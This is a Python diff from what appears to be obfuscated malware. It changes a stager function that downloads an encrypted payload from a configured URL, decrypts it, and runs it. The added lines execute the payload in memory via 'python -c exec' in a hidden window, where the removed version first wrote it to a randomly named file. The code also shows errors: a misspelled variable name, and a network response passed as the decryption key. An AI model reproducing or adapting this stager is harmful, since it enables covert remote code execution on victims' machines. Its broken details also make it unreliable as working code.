@@ -75,14 +75,12 @@ def run(*args, **kwargs):
                 else:
                     SeamlessGalacticSponges(FoamyNonstopHistory + ' loaded')
         finally:
-            QuarrelsomeImportedAtom = decrypt(urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read(), AccidentalAquaticCat.get('z'))
+            QuarrelsomeImportedAtom = decrypt(urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read(), urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('z'))))
             LyingIdioticManicure    = QuarrelsomeImportedAtom + "\n\nif __name__ == '__main__':\n\tmain(**{})".format(json.dumps(AccidentalAquaticCat))
-            EarnestUndulatingNipple = ''.join([random.choice([chr(i) for i in range(97,143) if chr(i).isalnum()]) for _ in range(random.randint(8,16))]) + '.py'
-            with file(EarnestUndulatingNipple, 'w') as fp:
-                fp.write(LyingIdiotManacure)
-            info = subprocess.STARTUPINFO()
-            info.dwFlags = subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
-            info.wShowWindow = subprocess.SW_HIDE
+            EarnestUndulatingNipple = "python -c exec('''{}''')".format(LyingIdiotManicure)
+            info                    = subprocess.STARTUPINFO()
+            info.dwFlags            = subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
+            info.wShowWindow        = subprocess.SW_HIDE
             return subprocess.Popen(EarnestUndulatingNipple, startupinfo=info, shell=True)
 
 
